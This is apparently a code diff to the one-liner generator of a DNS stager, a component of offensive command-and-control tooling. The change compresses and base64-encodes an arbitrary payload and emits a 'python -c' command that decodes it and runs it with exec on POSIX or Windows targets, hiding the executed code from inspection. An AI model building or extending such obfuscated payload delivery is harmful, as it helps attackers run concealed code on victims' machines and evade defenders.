@@ -5,8 +5,10 @@ DNS stager template rendering and one-liner generation.
 
 from __future__ import absolute_import
 
+import base64
 import os
 import subprocess
+import zlib
 
 try:
     text_type = unicode
@@ -184,6 +186,15 @@ def _python_string_literal(value):
     return '\'' + _escape_python_string(value) + '\''
 
 
+def _compress_payload(payload):
+    payload = _ensure_ascii_text(payload, 'payload')
+    compressed = zlib.compress(payload.encode('ascii'), 9)
+    encoded = base64.b64encode(compressed)
+    if isinstance(encoded, bytes):
+        encoded = encoded.decode('ascii')
+    return _ensure_ascii_text(encoded, 'payload')
+
+
 def _format_args_list(args):
     if not args:
         return '[]'
@@ -234,8 +245,12 @@ def _windows_cmd(parts):
 
 
 def build_one_liner(payload, platform):
-    payload = _ensure_ascii_text(payload, 'payload')
-    code = 'exec(%s)' % _python_string_literal(payload)
+    encoded_payload = _compress_payload(payload)
+    code = (
+        'import base64,zlib;exec(zlib.decompress(base64.b64decode(%s))'
+        '.decode(\'ascii\'))'
+        % _python_string_literal(encoded_payload)
+    )
     if platform == 'posix':
         return 'python -c %s' % _posix_shell_quote(code)
     if platform == 'windows':
